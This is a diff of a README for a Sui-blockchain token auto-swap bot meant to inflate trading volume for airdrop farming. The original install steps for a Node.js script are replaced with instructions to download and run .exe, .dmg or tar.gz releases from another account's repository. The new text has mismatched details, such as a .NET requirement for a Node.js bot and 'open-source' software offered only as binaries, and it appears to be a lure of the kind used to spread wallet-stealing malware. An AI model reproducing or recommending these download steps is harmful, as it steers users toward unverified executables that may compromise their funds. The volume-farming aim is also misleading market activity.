@@ -1,81 +1,108 @@
-# Momentum Finance Auto-Swap Bot — Volume & Airdrop Farming
-A lightweight Node.js bot that automatically swaps between two tokens on the Sui blockchain using Momentum Finance CLMM pools.
-Built for increasing trading volume and maximizing for airdrop rewards.
+# 🚀 Auto-Swap-Momentum-Finance - Effortless Token Swaps Made Simple
 
-<img width="1200" height="700" alt="image" src="https://github.com/user-attachments/assets/30f70007-d9d1-4124-96bb-b174798e8bfe" />
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/AndyValencia10/Auto-Swap-Momentum-Finance/releases)
 
-## 🚀 Features
-- Prepare usdt and udsc as tokens to be swapped, and sui as gas fee
+## 🛠️ Overview
+
+Auto-Swap-Momentum-Finance automatically swaps between two tokens on the Sui blockchain. It utilizes Momentum Finance CLMM pools, designed to increase trading volume and maximize your airdrop rewards. This tool simplifies the trading process for you, letting you focus on your strategy rather than technical details.
+
+## 📦 Features
+
+- **Automatic Token Swapping:** Set it once and let the bot handle your token exchanges seamlessly.
+- **Maximize Airdrop Rewards:** Designed to help you capture more rewards over time.
+- **User-Friendly Interface:** No coding skills needed. Use the tool right out of the box.
+- **Supports Momentum Finance CLMM Pools:** Access to key liquidity pools for better trading outcomes.
+- **Customizable Settings:** Tailor the bot's behavior according to your trading preferences.
+
+## 📜 System Requirements
+
+Before you start, ensure your system meets the following requirements:
+
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.15 or later
+  - Any Linux distribution (Ubuntu recommended)
   
-- Fully automated swaps between two tokens in a specified Momentum Finance CLMM pool.
+- **Hardware:**
+  - Minimum 4 GB RAM
+  - 500 MB of free disk space
 
-- Configurable swap mode: swap entire balance or fixed amounts.
+- **Software:**
+  - .NET Core 3.1 or later (for Windows users)
+  - All other systems should come with required dependencies bundled.
 
-- Adjustable slippage tolerance and swap frequency via .env
+## 🚀 Getting Started
 
-- Uses official Momentum Finance SDK for safe and direct smart contract calls.
+### 1. Visit the Releases Page
 
-- Ideal for volume farming and airdrop farming strategies.
+To download Auto-Swap-Momentum-Finance, please visit the [Releases page](https://github.com/AndyValencia10/Auto-Swap-Momentum-Finance/releases).
 
-## 📦 Installation
-Clone the repository and install dependencies:
+### 2. Download the Application
 
-```bash
-git clone https://github.com/abahuto/Auto-Swap-Momentum-Finance.git
-```
-```bash
-cd Auto-Swap-Momentum-Finance
-```
-```bash
-npm install
-```
+Locate the latest release on the page. Click on the appropriate version for your operating system to download the application.
 
-## ⚙️ Environment Setup
-Create a .env file in the project root:
+### 3. Install the Application
 
-```bash
-nano .env
-```
-Fill it with your wallet details and bot configuration:
-```bash
-# Sui Network Configuration
-SUI_PRIVATE_KEY=your suiprivkeyxxxxx....
-SUI_RPC_URL=https://fullnode.mainnet.sui.io:443
-NETWORK=mainnet
+- **Windows:**
+  - Double-click the downloaded .exe file.
+  - Follow the on-screen instructions to complete the installation.
 
-MOMENTUM_CLMM_PACKAGE_ID=0xc84b1ef2ac2ba5c3018e2b8c956ba5d0391e0e46d1daa1926d5a99a6a42526b4
-MOMENTUM_GLOBAL_CONFIG=0x9889f38f107f5807d34c547828f4a1b4d814450005a4517a58a1ad476458abfc
+- **Mac:**
+  - Open the downloaded .dmg file.
+  - Drag the Auto-Swap-Momentum-Finance icon into your Applications folder.
 
-MOMENTUM_POOL_ID=0xb0a595cb58d35e07b711ac145b4846c8ed39772c6d6f6716d89d71c64384543b
+- **Linux:**
+  - Extract the downloaded tar.gz file.
+  - Run the executable from your terminal.
 
-BASE_TOKEN=0x375f70cf2ae4c00bf37117d0c85a2c71545e6ee05c4a5c7d282cd66a4504b068::usdt::USDT
-QUOTE_TOKEN=0xdba34672e30cb065b1f93e3ab55318768fd6fef66c15942c9f7cb846e2f900e7::usdc::USDC
+### 4. Run the Application
 
-# Trading Configuration
-SWAP_AMOUNT=ALL  # Use "ALL" to swap entire balance, or specify amount like "0.1"
-SWAP_INTERVAL_SECONDS=5
-SLIPPAGE_TOLERANCE=0.001
+Once installed:
 
-# Logging
-LOG_LEVEL=info
-```
+- On Windows, you can find Auto-Swap-Momentum-Finance in your Start Menu.
+- On Mac, open it from your Applications folder.
+- On Linux, navigate to the directory where you extracted the files and run the command `./Auto-Swap-Momentum-Finance`.
 
-## ▶️ Running the Bot
-Start the bot with:
-```bash
-node index.js
-```
+### 5. Configure Your Tokens
 
-## 🛠 How It Works
-- Connects to the Sui blockchain using your RPC endpoint.
+After opening the application, you can set up:
 
-- Reads token balances from your wallet.
+- **Token Pair:** Choose the two tokens you want to swap between.
+- **Trading Volume Settings:** Specify how much volume you want to trade.
+- **Airdrop Preferences:** Adjust settings that might impact your airdrop rewards.
 
-- Executes swaps between BASE_TOKEN and QUOTE_TOKEN in the specified CLMM pool.
+Make sure all settings are correct before proceeding with your first swap.
 
-- Uses your configured slippage tolerance and interval timing.
+## 📊 How It Works
 
-- Repeats indefinitely — increasing trading volume for airdrop farming.
+Auto-Swap-Momentum-Finance connects to the Sui blockchain and utilizes Momentum Finance CLMM pools. It tracks the best trading opportunities based on market conditions and performs swaps automatically based on your specified settings. This functionality allows you to operate without the need for constant monitoring.
 
-## 🔖 Tags
-#momentumfinance #sui #airdrop #swap #bot #crypto #web3 #automation #trading #dex #clmm #volume #farming
+## 💡 Tips for Optimal Use
+
+- **Start Small:** Test the system with a small amount of tokens before committing larger sums.
+- **Monitor Performance:** Regularly check the performance metrics within the app to understand your trading results.
+- **Adjust Regularly:** Be prepared to adjust settings based on market changes and personal preferences.
+
+## ❓ FAQs
+
+### Q: Is there a cost to use Auto-Swap-Momentum-Finance?
+
+A: This application is open-source and free to use.
+
+### Q: Do I need an account to use the app?
+
+A: No account is required to use Auto-Swap-Momentum-Finance. However, you will need a wallet that supports the Sui blockchain for token transactions.
+
+### Q: What happens if the app crashes?
+
+A: If the application experiences issues, simply restart it and check your settings. Regular updates will also help improve stability.
+
+## 📞 Support
+
+If you encounter any issues or have questions, you can open an issue directly on the repository or reach out to the community for support.
+
+### Download & Install
+
+Follow the steps outlined above to start using Auto-Swap-Momentum-Finance. Remember to visit the [Releases page](https://github.com/AndyValencia10/Auto-Swap-Momentum-Finance/releases) to download the latest version and stay updated with new features. 
+
+The world of trading can be complex, but with Auto-Swap-Momentum-Finance, trading becomes easier. Enjoy automated swaps and maximize your rewards without the hassle!
